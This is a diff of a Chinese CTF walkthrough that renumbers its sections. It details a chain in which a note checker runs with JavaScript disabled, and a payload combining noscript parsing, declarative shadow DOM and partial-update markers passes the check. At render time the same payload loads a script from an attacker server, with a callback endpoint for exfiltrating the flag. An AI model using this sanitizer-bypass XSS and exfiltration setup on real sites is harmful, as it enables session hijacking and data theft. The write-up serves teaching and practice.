@@ -50,21 +50,21 @@ flag 在管理员专属接口 `/api/flag` 里，只有管理员会话能读到�
 
 ### 三条必须先记住的规则
 
-1. **笔记要经过严格的格式检查**。`POST /create` 会把提交的 HTML（截取前 512 字符）交给无头浏览器，在**关闭 JavaScript、断网**的条件下解析一次并检查最终 DOM；不通过直接拒绝。检查要求见 2.2：在**检查器这一次解析**中，`head` 必须恰好一个 CSP meta 标签、`body` 恰好一个空 `div`（属性与文本另有约束）。该约束只作用于检查器这一次解析；保存的是提交的字符串本身，之后它会被重新解析渲染（`/sandbox` 一次、审查页第二次访问一次），且渲染结果可以与检查结果不同。2.6 的利用点即在此。
+1. **笔记要经过严格的格式检查**。`POST /create` 会把提交的 HTML（截取前 512 字符）交给无头浏览器，在**关闭 JavaScript、断网**的条件下解析一次并检查最终 DOM；不通过直接拒绝。检查要求见 2.2：在**检查器这一次解析**中，`head` 必须恰好一个 CSP meta 标签、`body` 恰好一个空 `div`（属性与文本另有约束）。该约束只作用于检查器这一次解析；保存的是提交的字符串本身，之后它会被重新解析渲染（`/sandbox` 一次、审查页第二次访问一次），且渲染结果可以与检查结果不同。2.3 的利用点即在此。
 2. **机器人固定按顺序做五步**：登录管理员会话 → 访问审查页（第一次，只做标记）→ 访问 `/api/flag`（把 flag 缓存进本轮审查记录）→ 带机器人口令 `X-Bot-Token` 调用 `/reports/arm/:id`（把审查置为"已就位"）→ 访问你提交的网址并停留 10 秒。整个流程由同一个浏览器上下文执行（第 1 步在该上下文中建立管理员会话）；管理员会话只随发往应用主机（`localhost`）的请求发送，**发往你提交站点的请求不携带它**。
 3. **审查页只在第二次访问时输出笔记原文，且该次响应不带任何 CSP 响应头**。审查页 `GET /reports/check` 第一次被访问时只设置一个"已访问"标记并返回占位页；第二次访问要通过全部检查，才会把笔记 HTML 原样输出。这个输出点就是整条攻击链的终点。
 
 > 关于第 3 条的两点说明：
-> - **CSP**（Content Security Policy，内容安全策略）：浏览器用来限制页面能加载和执行哪些内容的机制，通过 HTTP 响应头或页面内的 meta 标签下发。本题中，检查器要求每篇笔记自带一个 CSP meta 标签，声明 `default-src 'none'`（禁止一切外部资源），但第 3 条说的那个输出点，**既不带响应头 CSP，笔记自带 meta 的生效时机也晚于脚本执行**。机制在 2.6 展开。
+> - **CSP**（Content Security Policy，内容安全策略）：浏览器用来限制页面能加载和执行哪些内容的机制，通过 HTTP 响应头或页面内的 meta 标签下发。本题中，检查器要求每篇笔记自带一个 CSP meta 标签，声明 `default-src 'none'`（禁止一切外部资源），但第 3 条说的那个输出点，**既不带响应头 CSP，笔记自带 meta 的生效时机也晚于脚本执行**。机制在 2.3 展开。
 > - "第二次访问"这个名字来自源码结构：`GET /reports/check` 的处理函数先判断 `currentReview.visited` 是否已为真，为真走"渲染分支"，为假走"标记分支"。这两个名字是本文对两段代码的称呼，源码中并没有它们。
 
 ### 攻击链概要
 
-1. 准备一篇"检查时是空白文档、渲染时执行脚本"的笔记（2.6）；
-2. 准备回调服务器并提供四个端点，把它的网址提交给机器人（2.5）；
-3. 机器人访问期间：借它的浏览器打开审批页面，把审批状态置为"已批准"（2.7）；
-4. 用浏览器历史回退制造一次满足 `Sec-Fetch-Site: none` 的导航，让审查页发生第二次访问并通过全部检查（2.8）；
-5. 笔记原文在挑战域内被渲染，脚本再次执行，读取 flag 并发送到回调服务器（2.9）。
+1. 准备一篇"检查时是空白文档、渲染时执行脚本"的笔记（2.3）；
+2. 准备回调服务器并提供四个端点，把它的网址提交给机器人（2.4、2.5）；
+3. 机器人访问期间：借它的浏览器打开审批页面，把审批状态置为"已批准"（2.7、2.8）；
+4. 用浏览器历史回退制造一次满足 `Sec-Fetch-Site: none` 的导航，让审查页发生第二次访问并通过全部检查（2.9）；
+5. 笔记原文在挑战域内被渲染，脚本再次执行，读取 flag 并发送到回调服务器（2.10）。
 
 ### 术语约定
 
@@ -85,7 +85,7 @@ flag 在管理员专属接口 `/api/flag` 里，只有管理员会话能读到�
 
 ## 二、完整复现（从部署到拿到 flag）
 
-本章目标：从部署开始，按发生顺序走完整条攻击链，直到拿到 flag。全章分两段：2.2 到 2.4 是攻击必须吃透的三个对象（笔记检查器、机器人流程、审查页），每节末尾都落到攻击上（2.2.2、2.3.4 两处"攻击关联"，以及 2.4 末尾的四个问题及对应做法）；2.5 准备回调服务器，2.6 到 2.9 逐项解决这四个问题；2.10 把全部动作汇成完整时序。涉及的浏览器机制在使用它们的段落就地解释，不要求提前理解。
+本章目标：从部署开始，按一次成功复现的真实发生顺序，走完整条攻击链直到拿到 flag，不跳步。全章顺序：准备阶段（2.1 部署；2.2 检查器；2.3 制作攻击笔记；2.4 准备回调服务器；2.5 提交入口页地址）；机器人执行阶段（2.6 五步流程，其中第 2 步到访审查页时就地讲解它的两次访问与八项检查）；攻击窗口（2.7 到 2.10：机器人第 5 步停留的 10 秒内，按时间先后发生的四段攻击）；2.11 汇总完整时序。涉及的浏览器机制在使用它们的段落就地解释，不要求提前理解。
 
 ### 2.1 部署
 
@@ -123,7 +123,7 @@ curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3001/    # 期望 200
 
 ```javascript
 // page 是 Puppeteer 的页面对象：bot.js 通过 Puppeteer 驱动容器内的无头 Chromium（bot/package.json 依赖 puppeteer ^24.32.0，package-lock.json 锁定 24.43.0）
-await page.setJavaScriptEnabled(false);   // 关闭 JavaScript：检查阶段不执行笔记中的脚本；解析规则随之变为"禁用脚本"模式（noscript 按标记解析，这是 2.6 的利用点之一）
+await page.setJavaScriptEnabled(false);   // 关闭 JavaScript：检查阶段不执行笔记中的脚本；解析规则随之变为"禁用脚本"模式（noscript 按标记解析，这是 2.3 的利用点之一）
 await page.setOfflineMode(true);           // 断网：检查阶段不加载任何外部资源（笔记无法在检查时与外部通信）
 await page.setContent(source, { waitUntil: "domcontentloaded", timeout: 5000 });   // 把 HTML 字符串直接写入页面：得到"笔记解析后的 DOM"供下面的判定读取（不经过网络加载）
 
@@ -171,7 +171,7 @@ return await page.evaluate(() => {
 <!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div></div></body></html>
 ```
 
-这只是合法形态的一例，不是唯一形态。判定标准是上面七项条件全部成立，而不是与示例逐字相同；2.6 的攻击 payload 与它源码完全不同，但检查器解析出的元素结构一致，同样通过检查。更多示例与通过原因见 2.2.1。
+这只是合法形态的一例，不是唯一形态。判定标准是上面七项条件全部成立，而不是与示例逐字相同；2.3 的攻击 payload 与它源码完全不同，但检查器解析出的元素结构一致，同样通过检查。更多示例与通过原因见 2.2.1。
 
 用 curl 创建并确认通过（通过会 302 到预览页）：
 
@@ -183,7 +183,7 @@ curl -si http://127.0.0.1:3001/create \
 # 期望：HTTP/1.1 302 Found   Location: /note/<编号>
 ```
 
-这个检查的直接后果：**检查器只约束它计数的结构**：`head`/`body` 的元素数量、`meta` 与 `div` 的属性、`body` 的文本；注释、处理指令、声明式影子树的内容不在计数范围内，不受这些约束。检查用的三个设置（JavaScript 关闭、离线、字符串直投）在 2.6 是绕过检查的突破口，先记住它们。
+这个检查的直接后果：**检查器只约束它计数的结构**：`head`/`body` 的元素数量、`meta` 与 `div` 的属性、`body` 的文本；注释、处理指令、声明式影子树的内容不在计数范围内，不受这些约束。检查用的三个设置（JavaScript 关闭、离线、字符串直投）在 2.3 是绕过检查的突破口，先记住它们。
 
 #### 2.2.1 更多合法示例与通过原因
 
@@ -207,7 +207,7 @@ HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 
 
 **例 3：meta 由 DPU 从文档末尾搬进 head**
 
-本例用到 DPU（Declarative Partial Updates，声明式部分更新），先说明它是什么：这是 HTML 的一个解析特性；`<?marker name="c">` 在文档中留一个占位点（处理指令节点，不是元素），文档后面的 `<template for=c>` 提供内容；解析器读到 `<template for=c>` 时，把它的内容搬入占位点的位置（占位点被替换）。完整机制与版本信息见 2.6.4。
+本例用到 DPU（Declarative Partial Updates，声明式部分更新），先说明它是什么：这是 HTML 的一个解析特性；`<?marker name="c">` 在文档中留一个占位点（处理指令节点，不是元素），文档后面的 `<template for=c>` 提供内容；解析器读到 `<template for=c>` 时，把它的内容搬入占位点的位置（占位点被替换）。完整机制与版本信息见 2.3.4。
 
 ```html
 <!doctype html><head><?marker name="c"></head><div></div><template for=c><meta http-equiv="content-security-policy" content="default-src 'none'"></template>
@@ -221,7 +221,7 @@ HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 
 <!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode=open><p>影子内容</p></template></div></body></html>
 ```
 
-本例用到声明式影子树（Shadow DOM），先说明它是什么：某个元素上可以挂一棵独立的 DOM 树，这棵树叫影子树。影子根不是该元素的子节点，影子树里的节点也不在该元素的普通子树（由该元素的普通子节点构成）中；`children`、`childElementCount`、`textContent` 这类访问都只遍历普通子树，因此看不到影子树里的内容。带 `shadowrootmode` 的 template 会被解析器消费：它的内容全部进入 div 的影子树，template 本身不留在普通树里。检查器数到的 div 是空的，影子树里的文本也不计入 `body.textContent`。完整机制见 2.6.3。七项条件全部成立。
+本例用到声明式影子树（Shadow DOM），先说明它是什么：某个元素上可以挂一棵独立的 DOM 树，这棵树叫影子树。影子根不是该元素的子节点，影子树里的节点也不在该元素的普通子树（由该元素的普通子节点构成）中；`children`、`childElementCount`、`textContent` 这类访问都只遍历普通子树，因此看不到影子树里的内容。带 `shadowrootmode` 的 template 会被解析器消费：它的内容全部进入 div 的影子树，template 本身不留在普通树里。检查器数到的 div 是空的，影子树里的文本也不计入 `body.textContent`。完整机制见 2.3.3。七项条件全部成立。
 
 **例 5：影子树里放脚本（攻击形态的检查器视角）**
 
@@ -229,13 +229,13 @@ HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 
 <!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode=open><script src=https://回调服务器/s.js></script></template></div></body></html>
 ```
 
-机制与例 4 相同，只是把影子内容换成了 `<script>`。检查器不计数影子树，也不会执行脚本（因为 JavaScript 被关闭，上面已经讲过），它看到的结构与例 4 一模一样，七项条件全部成立；而浏览器渲染这份笔记时，影子树里的脚本会执行。这就是 2.6 攻击 payload 能通过检查的原理。
+机制与例 4 相同，只是把影子内容换成了 `<script>`。检查器不计数影子树，也不会执行脚本（因为 JavaScript 被关闭，上面已经讲过），它看到的结构与例 4 一模一样，七项条件全部成立；而浏览器渲染这份笔记时，影子树里的脚本会执行。这就是 2.3 攻击 payload 能通过检查的原理。
 
 以上五个示例均已提交给真实检查器实测（`/create` 全部返回 302；未通过检查的笔记会返回 400）。
 
 #### 2.2.2 攻击关联：攻击笔记与七项条件的对应关系
 
-七项条件不是纸面规则：2.6.5 最终提交的攻击笔记，就是对着它们逐条做出来的。先看成品（完整推演见 2.6.5）：
+七项条件不是纸面规则：最终提交的攻击笔记就是对着它们逐条做出来的（完整推演见 2.3.5）。先看成品：
 
 ```html
 <!doctype html><head><?marker name="c"></head><div><template shadowrootmode=open><noscript><a alt="</noscript></template><script src=https://回调服务器/s.js></script>">x</a></noscript></template></div><template for=c><meta content="default-src 'none'"http-equiv=content-security-policy></template>
@@ -244,25 +244,203 @@ HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 
 | 条件 | 攻击笔记里由什么满足 |
 |---|---|
 | 1 doctype | 开头就是 `<!doctype html>` |
-| 2、3 `head` 恰好 1 个元素、是带指定属性的 CSP meta | 由 DPU 提供：head 里只放 `<?marker name="c">` 占位点（处理指令，不是元素），meta 写在文档末尾的 `<template for=c>` 里，解析末尾被搬进 head（DPU 见 2.6.4） |
-| 4、5 `body` 恰好 1 个元素、是空 `div` | 危险内容全部放进 div 的声明式影子树；影子树的节点不是普通子节点，不参与计数（声明式影子树见 2.6.3） |
+| 2、3 `head` 恰好 1 个元素、是带指定属性的 CSP meta | 由 DPU 提供：head 里只放 `<?marker name="c">` 占位点（处理指令，不是元素），meta 写在文档末尾的 `<template for=c>` 里，解析末尾被搬进 head（DPU 见 2.3.4） |
+| 4、5 `body` 恰好 1 个元素、是空 `div` | 危险内容全部放进 div 的声明式影子树；影子树的节点不是普通子节点，不参与计数（声明式影子树见 2.3.3） |
 | 6 `body` 文本为空白 | 影子树里的文本不计入 `body.textContent`（同上） |
 | 7 属性白名单 | 被计数的元素（`html`/`head`/`body`/`div`/`meta`）都不带多余属性；meta 只有 `http-equiv` 与 `content` |
 
-两句话总结：这份笔记在检查器眼里是一篇合法的空白文档（解析出的元素结构与最小示例一致，七项全过），在浏览器渲染时是一段会立即执行的脚本（noscript 两种解析模式的逐步推演见 2.6.5）。接下来 2.3 与 2.4 认识另外两个对象（机器人流程、审查页），末尾同样落到攻击上。
+两句话总结：这份笔记在检查器眼里是一篇合法的空白文档（解析出的元素结构与最小示例一致，七项全过），在浏览器渲染时是一段会立即执行的脚本（noscript 两种解析模式的逐步推演见 2.3.5）。下一节（2.3）就按发生顺序把这份攻击笔记完整做出来。
 
-### 2.3 机器人的完整流程
+### 2.3 攻击笔记：检查时是空白文档、渲染时执行脚本
 
-本节按调用顺序分三部分：`review()` 由什么触发、怎么被调用（2.3.1），它内部按什么顺序执行（2.3.2），以及它对提交页面的导航监听规则（2.3.3）。
+> 一句话说明：2.2 的检查器与真正的浏览器读取的是同一份字符串，但两者环境不同：检查器关闭 JavaScript，浏览器开启。HTML 解析器在两种 JavaScript 开关下会产生不同结果；利用这一点，可以做出"检查时是空白文档、渲染时包含可执行脚本"的笔记。
 
-#### 2.3.1 触发与调用链：review() 是怎么被调用的
+#### 2.3.1 两个环境的三个差异点
 
-整个机器人流程由一次 **POST /report** 请求触发（攻击者提交目标网址就是这一步）。触发入口有两个（等价）：
+| 维度 | 检查器（`inspectDocument`） | 渲染端（浏览器打开 `/sandbox` 或审查页） |
+|---|---|---|
+| JavaScript | 关闭 | 开启 |
+| 网络 | 离线 | 在线 |
+| HTML 的传递方式 | `page.setContent(字符串)` | 真实 HTTP 响应体 |
+
+差异点的来源是三个 HTML 规范行为：
+
+1. **`<noscript>` 的两种解析模式**：JS 关闭时按普通标签解析其内容，JS 开启时按"原始文本"解析（只找结束标记 `</noscript>`）。同一段字符串因此可以产出两棵不同的 DOM；
+2. **声明式 Shadow DOM**：`<template shadowrootmode=...>` 会被解析器"消费"：内容进入影子树，template 标签本身不进入文档树、内容不计入父元素的子元素数量；
+3. **DPU 声明式部分更新**（Declarative Partial Updates，2026 年 5 月公告的 HTML 新特性）：`<?marker name=...>` 处理指令与 `<template for=...>` 配对，可以**在文档解析到该 template 时才把内容搬运到 marker 的位置**。
+
+下面逐个说明，它们各自的作用在 2.3.5 组装 payload 时会合起来。
+
+#### 2.3.2 机制一：`<noscript>` 的两种解析模式
+
+HTML 解析器里有一个"脚本开关"（是否启用 JavaScript）。`<noscript>` 的内容如何解析完全取决于它：
+
+- **JS 关闭**：`<noscript>` 内容被当作正常标记解析，里面的标签会成为真实元素；
+- **JS 开启**：`<noscript>` 内容被当作原始文本，解析器不做标签解析，只查找字符串 `</noscript>` 来结束这一段。
+
+用一个最小例子对照（这段 HTML 本身不会通过 2.2 的检查，仅用于演示机制）：
+
+```html
+<noscript><a alt="</noscript><script>alert(1)</script>">x</a></noscript>
+```
+
+| JavaScript 状态 | 解析过程 | 结果 DOM |
+|---|---|---|
+| 关闭 | `<a` 开始标签的 `alt` 属性值为引号内的整段文本 `</noscript><script>alert(1)</script>`；引号内不会解析出任何标签 | 只有 `<a>` 元素；**没有** script 元素 |
+| 开启 | 原始文本模式只查找 `</noscript>`，它在 `alt` 属性值的**内部**就第一个命中，noscript 在此提前结束；后续的 `<script>alert(1)</script>` 成为真实元素 | 存在 script 元素，**会执行** |
+
+关键点：**同一段文本，在 JS 关闭时被视为属性值的一部分（不产生元素），在 JS 开启时则成为真实标签**。这就是"检查器通过、渲染器执行"两种结果的来源。
+
+#### 2.3.3 机制二：声明式 Shadow DOM
+
+普通影子树要用 JavaScript 调用 `element.attachShadow()` 创建；声明式写法只用 HTML：
+
+```html
+<div><template shadowrootmode=open><p>影子内容</p></template></div>
+```
+
+解析器遇到带 `shadowrootmode` 属性的 `<template>` 时：
+
+1. 在父元素（这里是 `div`）上创建一个影子根（shadow root）；
+2. 把 `<template>` 的内容放入影子树；
+3. **`<template>` 元素本身不进入文档树**。
+
+对检查器的三个直接效果：
+
+- 影子树里的元素**不计入**父元素的 `childElementCount`（对检查器来说 `div` 看起来是空的）；
+- 影子树里的文本**不计入** `document.body.textContent`；
+- 上述两条对检查器使用的 `page.evaluate` 中的任何 DOM 查询都成立。
+
+版本信息：Chrome 90（2021 年，旧属性名 `shadowroot`）首次支持；Chrome 111（2023 年 3 月）改为现行属性名 `shadowrootmode`；Chrome 124（2024 年）完成标准化。本题容器内是 Chromium 152，全部支持。
+
+#### 2.3.4 机制三：DPU 声明式部分更新
+
+DPU 是 2026 年 5 月 19 日发布的 HTML 新提案（Chrome 官方博客《Declarative partial updates》），用两条语法完成"内容搬运"：
+
+```html
+<div><?marker name="c"></div>
+...
+<template for=c><b>后到的内容</b></template>
+```
+
+解析完成后 `div` 里是 `<b>后到的内容</b>`。两条规则：
+
+1. `<?marker name="c">` 是**处理指令节点**（Processing Instruction）：它**不是元素**，不占 `childElementCount`、不计入元素查询；
+2. 解析器读到 `<template for=c>` 时，才把它的内容搬入 marker 的位置（marker 被搬入的内容替换）；**template 本身不进入文档树**。
+
+对检查器的两个直接效果：
+
+- 放在文档**末尾**的 `<template for=...>` 里的元素，会出现在文档**前面**的 marker 位置（比如 `head` 里）；
+- 搬运发生在**解析到末尾那条 template 的时刻**。在此之前，那个位置是空的。也就是说，可以让检查器最终看到"head 里恰好有一个 meta"，同时让这个 meta 在解析过程中的大部分时间里都不存在。
+
+版本信息：Chrome 官方博客（2026 年 5 月 19 日发布，9 月 8 日更新）中的支持表为：`<?marker>`/`<template for>` 自 Chrome 150 起支持，Firefox 与 Safari 尚未支持。本题容器内是 Chromium 152，已包含该特性，实测直接生效。以目标环境实测为准，不要只凭版本号判断。
+
+> 三个机制的分工可以先记成一句话：**noscript 决定"什么内容会变成标签"，影子 DOM 决定"检查器统计不到哪些元素"，DPU 决定"元素什么时候出现在目标位置"**。下一节把它们组合成完整 payload。
+
+#### 2.3.5 payload 组装：一份输入、两个视角
+
+完整的笔记 HTML（做成一行，就是提交给 `/create` 的内容；把 `https://回调服务器` 替换成你自己的地址）：
+
+```html
+<!doctype html><head><?marker name="c"></head><div><template shadowrootmode=open><noscript><a alt="</noscript></template><script src=https://回调服务器/s.js></script>">x</a></noscript></template></div><template for=c><meta content="default-src 'none'"http-equiv=content-security-policy></template>
+```
+
+先看它的结构，共五个部分：
+
+| 部分 | 内容 | 作用 |
+|---|---|---|
+| A | `<head><?marker name="c"></head>` | 在 head 里放一个 DPU 占位标记 |
+| B | `<div><template shadowrootmode=open>...</template></div>` | 用一个声明式影子树包住所有"危险元素"，使检查器统计不到它们 |
+| C | `<noscript><a alt="`…`">x</a></noscript>` | 靠 noscript 的双模式在两种环境下产出不同结果 |
+| D | `<script src=.../s.js></script>` | 由 C 包裹的脚本本体（检查时是属性值文本、渲染时是元素） |
+| E | `<template for=c><meta ...></template>`（文档末尾） | 用 DPU 把 CSP meta 在解析末尾搬进 head |
+
+**检查器视角（JavaScript 关闭）逐步推演**：
+
+1. `<!doctype html>` → doctype 名称为 `html` ✓；
+2. `<head>` 开始；
+3. `<?marker name="c">` → 处理指令节点（**不是元素**，不计数）；此时 head 里还没有 meta；
+4. `</head>`；
+5. `<div>` → body 隐式创建，div 进入 body；
+6. `<template shadowrootmode=open>` → div 上创建影子根，template 内容全部进入影子树；template 元素本身不进文档树；
+7. `<noscript>` → JS 关闭：内容按普通标记解析；
+8. `<a alt="` → `alt` 属性值吸收引号内的整段文本 `</noscript></template><script src=...></script>`；**这段文本不产生任何元素**（那个 script 只是字符串）；生成的 `<a>` 元素位于影子树内部；
+9. `">x</a>` → `<a>` 闭合（影子树内部）；随后 `</noscript>` 闭合 noscript（影子树内部）；
+10. `</template>` → 影子根内容插入结束；
+11. `</div>` → div 闭合；**div 的普通子元素数量为 0**（步骤 6-10 的内容都在影子树里）；
+12. `<template for=c>` → DPU 搬运：meta 被放入 head 中 marker 的位置；template 本身不进文档树；
+13. 解析结束。检查器看到的最终 DOM：`head` 里只有 meta 一个元素（marker 的位置被搬入的内容替换；元素计数 1），`body` = [div]（元素计数 1），div 子元素 0，body 文本只含空白，全部元素无多余属性 → **七项检查全过** ✓。
+
+**渲染器视角（JavaScript 开启）逐步推演**：
+
+1. 到步骤 6 为止与上面相同（div + 影子根已创建）；
+2. `<noscript>` → JS 开启：原始文本模式，解析器只查找 `</noscript>`；
+3. 第一个 `</noscript>` 出现在 `alt` 引号内部（字符串 `<a alt="` 之后）→ noscript 在此提前闭合；影子树里的 noscript 内容只是文本 `<a alt="`；
+4. `</template>` → 影子根内容插入结束；
+5. `<script src=.../s.js>` → **成为真实元素**（插入 div 的普通子树）；外部脚本是"解析阻塞"的，浏览器会立即加载并执行它；
+6. **执行时刻的关键**：此时文档还没解析到步骤 8 的末尾 template，**head 里还没有 meta，页面没有任何 CSP 生效**，脚本顺利加载运行；`/sandbox` 的响应头 CSP 为 `sandbox allow-scripts; base-uri 'none'; frame-ancestors 'self'`，里面没有 `script-src` 一类限制脚本加载的指令，也不会拦它；
+7. `">x</a>` 等剩余字符 → 成为 div 里的文本或多余闭合标签，无影响；
+8. `<template for=c>` → meta 这时才被搬进 head。CSP 只对生效之后的资源加载起作用，而脚本已经执行完毕。
+
+两个视角对照：
+
+| 检查项 | 检查器视角 | 渲染器视角 |
+|---|---|---|
+| head 元素数 | 1（meta，被 DPU 搬入） | 1（meta，但直到解析末尾才出现） |
+| body 元素数 | 1（div） | 1（div） |
+| div 子元素 | 0（内容在影子树） | 脚本元素是真实存在的 |
+| script 元素 | 不存在（只是 alt 属性值里的字符串） | 存在并执行 |
+| 执行时 CSP | 不涉及 | 尚未生效（meta 还没进 head） |
+
+创建这份笔记并取回编号：把上面那一行原样保存为 `payload.html`（单引号与无引号属性不要改动），然后提交（与 2.2 的提交方式相同）：
+
+```bash
+curl -si http://127.0.0.1:3001/create -d 'title=t' --data-urlencode html@payload.html | head -3
+# 期望：HTTP/1.1 302 Found   Location: /note/<编号>
+# 记下 <编号>：2.3.6 的验证与 2.5 的提交地址都要带上它；第五章脚本的取法：note_id = created.headers["Location"].rsplit("/", 1)[-1]
+```
+
+#### 2.3.6 本地验证脚本确实在渲染时执行
+
+机器人不会主动打开审批页面，因此默认流程里不会发生笔记的解析渲染（脚本不会执行）；要单独验证脚本能执行，需要把机器人引到 `/review`，由沙箱 iframe 加载笔记。验证用到回调服务器（2.4）与第五章脚本的 `/s.js`，步骤：
+
+1. 把回调服务器的 `/s.js` 临时改为一行代码 `fetch('https://回调服务器/hit')`，并加一个记录日志的 `/hit` 路由；
+2. 提交 `/report`，网址填 `http://localhost:3000/review?note=<笔记编号>`（机器人会追加 `rid`；机器人浏览器自带管理员会话，`prepared` 也已就位，沙箱可以正常加载笔记），或直接运行第五章的完整脚本走到阶段二；
+3. 回调服务器收到 `/hit` 请求，即证明脚本在沙箱渲染时执行；验证后把 `/s.js` 改回正式内容（第五章）。
+
+### 2.4 回调服务器准备
+
+攻击笔记已经就绪（2.3）。还需要一个攻击者自己能控制的服务器：入口页、笔记里引用的脚本、接收 flag 的端点都放在它上面。它必须能被机器人访问到：本地复现时跑在宿主机上，容器通过 `http://host.docker.internal:8000` 访问（`host.docker.internal` 是 Docker 提供的一个特殊域名，指向宿主机）；远程做题时用一个公网可达的地址（例如公共 webhook 服务或自己的 VPS）。它提供四个端点：
+
+| 路由 | 第一次响应 | 第二次响应 | 作用 |
+|---|---|---|---|
+| `/`（根路径，带 `?note=` 参数） | 一段带 JavaScript 的 HTML | 302 重定向到 `http://localhost:3000/reports/check?rid=<rid>` | 入口页；第二次访问时把机器人送往审查页（2.9） |
+| `/helper` | 一段带 JavaScript 的 HTML | 无 | 对入口页执行历史回退（2.9） |
+| `/s.js` | JavaScript 代码 | 无 | 注入笔记中的脚本（双分支，2.3/2.10） |
+| `/flag?x=<base64>` | 无 | 无 | 接收外传的 flag（2.10） |
+
+入口页与 `/s.js` 的具体内容在对应小节逐段给出。所有响应都带 `Cache-Control: no-store`（入口页这一条在 2.9 会用到）。
+
+实现与启动：回调服务器与整套攻击编排写在同一个 Python 脚本里（完整可运行代码见第五章），在宿主机直接运行该脚本即启动（监听 8000 端口；环境与步骤见 6.2）。2.7 到 2.10 会在用到它的地方引用对应代码段。
+
+### 2.5 提交：把入口页地址交给机器人
+
+两个材料就绪：攻击笔记（2.3）和回调服务器（2.4）。把回调服务器的入口页地址提交给机器人，整条攻击链由此启动。
+
+#### 2.5.1 提交的网址
+
+提交的是入口页的地址，本地复现为 `http://host.docker.internal:8000/?note=<编号>`，拆开看：
+
+- `http://host.docker.internal:8000/`：回调服务器地址。机器人打开提交的链接，就是向这个地址发请求；回调服务器返回的那张页面就是"入口页"，也就是机器人看到的第一张攻击者页面（对应 2.4 表中作用为入口页的那一行）；
+- `?note=<编号>`：笔记编号参数，由攻击者填；编号来自 `/create` 创建笔记后返回的 `/note/<编号>`（2.3.5）；
+- `&rid=<本轮编号>`：不在提交的网址里，由机器人访问前追加（2.6.1 步骤 5 的 `url.searchParams.set("rid", report.id)`）；入口页从 `location.search` 读到它，在 2.9 用它把机器人 302 到审查页。
+
+提交有两个入口（等价）：
 
 - 页面：打开实例首页（即 2.1 里启动后 curl 验证的那个地址）。首页包含 "Create note" 与 "Report document" 两块面板和最近笔记列表；其中 "Report document" 面板是提交网址的入口，填写 URL 后点 Send，浏览器提交的就是 POST /report；
-- 命令行：`curl -d 'url=<目标网址>' http://<实例>/report`（复现脚本用这个，见第五章；本挑战中这个网址的具体形态见 2.3.4）。
+- 命令行（复现脚本用这个，见第五章）：`curl -d 'url=http://host.docker.internal:8000/?note=<编号>' http://127.0.0.1:3001/report`。
 
-"Report document" 面板的表单片段（来自 `src/views/index.ejs`，省略了外层的 `<p>` 与 `<label>` 标签），提交表单会调用`/report`接口：
+"Report document" 面板的表单片段（来自 `src/views/index.ejs`，省略了外层的 `<p>` 与 `<label>` 标签）：
 
 ```html
 <form method="post" action="/report">
@@ -271,16 +449,14 @@ HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 
 </form>
 ```
 
-表单属性与后端逐一对应：`method="post"` 与 `action="/report"` 决定点 Send 时向 `/report` 发送 POST 请求；`name="url"` 是服务器读取网址所用的键名（对应下方处理器源码里的 `req.body.url`）。
+表单属性与后端逐一对应：`method="post"` 与 `action="/report"` 决定点 Send 时向 `/report` 发送 POST 请求；`name="url"` 是服务器读取网址所用的键名（对应下面处理器源码里的 `req.body.url`）。
+
+#### 2.5.2 提交后：服务器做了什么
 
 `review` 不是由浏览器执行的，而是被 `src/server.js` 的 `/report` 路由处理器直接调用（跨文件调用）。模块接线：
 
 - `src/server.js` 顶部：`const { inspectDocument, review } = require("../bot/bot");`（`inspectDocument` 被 `/create` 调用，`review` 被 `/report` 调用）；
 - `bot/bot.js` 末尾：`module.exports = { inspectDocument, review };`。
-
-调用链（一行）：
-
-`POST /report` → `reportRateLimit` 限速 → `/report` 处理器（单例检查 → URL 校验 → 构造 `currentReview`）→ `await review(currentReview)`（进入 bot.js）→ 机器人执行五步（2.3.2）→ 返回 → 处理器渲染结果并清空 `currentReview`。
 
 处理器源码（`src/server.js`，注释为逐行说明）：
 
@@ -333,7 +509,7 @@ app.post("/report", reportRateLimit, async (req, res) => {   // reportRateLimit�
 | 4 | server.js | 协议必须是 http/https | 400 Only HTTP and HTTPS URLs are accepted |
 | 5 | server.js | 取 `note=` 参数、生成编号、构造 `currentReview`（状态位全 false） | 无 |
 | 6 | server.js → bot.js | `await review(currentReview)`：调用机器人，传入刚构造的同一个对象引用 | 抛错 → 500 Review failed |
-| 7 | bot.js | `review()` 内部按 2.3.2 的五步执行 | 无 |
+| 7 | bot.js | `review()` 内部按 2.6 的五步执行 | 无 |
 | 8 | server.js | 渲染 "The reviewer finished."；`finally` 清空 `currentReview` | 无 |
 
 三个细节：
@@ -342,9 +518,13 @@ app.post("/report", reportRateLimit, async (req, res) => {   // reportRateLimit�
 - `finally` 里清空 `currentReview` 之后，才允许提交下一轮（对应第 2 步的单例检查）；
 - `review()` 与服务器同在一个 Node 进程内执行（bot.js 是被 server.js `require` 的模块），它启动的是独立的无头 Chromium 进程。
 
-#### 2.3.2 review() 的执行顺序
+`await review(currentReview)` 之后，机器人开始工作；提交方会一直等到整轮结束。机器人具体做什么，下一节（2.6）按它的执行顺序讲。
 
-被调用后，`review(report)` 内部按下面的顺序执行；先看整体代码（含步骤注释）：
+### 2.6 机器人的五步执行
+
+#### 2.6.1 五个步骤的代码与总表
+
+`review(report)` 内部按下面的顺序执行；先看整体代码（含步骤注释）：
 
 ```javascript
 const context = await browser.createBrowserContext();     // 为本次审查创建独立浏览器上下文：其下所有页面共享同一份 cookie（步骤 1 建立的管理员会话供后续步骤共用）
@@ -370,9 +550,9 @@ await fetch(`${APP_URL}/reports/arm/${report.id}`, {
 const page = await context.newPage();
 const url = new URL(report.url);
 url.searchParams.set("rid", report.id);       // 在提交的网址后追加 rid 参数（本轮编号会出现在页面地址里，供后续利用读取）
-watchDocument(page, report, url.href);        // 启动主窗口导航监听（定义在 bot.js）：逐次记录主窗口导航以判定 finalized 状态（规则见下文）
+watchDocument(page, report, url.href);        // 启动主窗口导航监听（定义在 bot.js）：逐次记录主窗口导航以判定 finalized 状态（规则见 2.6.3）
